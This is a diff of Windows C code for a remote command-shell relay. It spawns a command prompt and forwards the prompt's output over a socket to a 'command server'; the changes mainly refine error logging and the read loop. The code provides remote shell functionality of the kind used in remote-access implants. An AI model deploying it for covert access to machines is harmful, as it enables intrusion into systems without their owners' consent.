@@ -13,7 +13,6 @@ struct cmdGlobalsStruct {
     HANDLE cmdOut;   // set by createCommandPrompt()
     HANDLE cmdIn;    // set by createCommandPrompt()
     SOCKET cmdSock;  // copied from socket passed to startCMD
-    DWORD cmdProcID; // set by createCommandPrompt()
 } cmdGlobals;
 
 /*
@@ -131,8 +130,6 @@ int createCommandPrompt() {
         return err;
     }
     else {
-        // copy the process ID of the spawned command prompt
-        cmdGlobals.cmdProcID = piProcInfo.dwProcessId;
         // close handles to the child process and its primary thread
         CloseHandle(piProcInfo.hProcess);
         CloseHandle(piProcInfo.hThread);
@@ -175,22 +172,29 @@ int inputToCMD(char* buff, int inputLen) {
 *	0 on successful exit, otherwise returns the last error code
 */
 DWORD WINAPI cmdOutputThread(LPVOID lpParam) {
-    DWORD dwRead, dwWritten;
+    DWORD dwRead, dwWritten, dResult;
     CHAR chBuf[4096];
     BOOL bSuccess = FALSE;
-    int res;
 
-    for (;;)
+    while (TRUE)
     {
+        // read the command prompt output
         bSuccess = ReadFile(cmdGlobals.cmdOut, chBuf, 4096, &dwRead, NULL);
         if (!bSuccess || dwRead == 0) {
-            logMessage("ReadFile error in thread\n");
+            DWORD err = GetLastError();
+            if (err == ERROR_BROKEN_PIPE) {
+                logMessage("Command prompt closed. Stopping cmd output thread\n");
+            } else if (!bSuccess) {
+                logMessage("Readfile error in cmd output thread: %d\n", GetLastError());
+            } else {
+                logMessage("Read 0 bytes from command prompt. Stopping cmd output thread\n");
+            }
             break;
         }
-
-        res = send(cmdGlobals.cmdSock, chBuf,dwRead, 0);
-        if (res == SOCKET_ERROR) {
-            logMessage("Send error in thread\n");
+        // send the output to the command server
+        dResult = send(cmdGlobals.cmdSock, chBuf, dwRead, 0);
+        if (dResult == SOCKET_ERROR) {
+            logMessage("Failed to send cmd output to command server with error code: %d\n", WSAGetLastError());
             break;
         }
     }
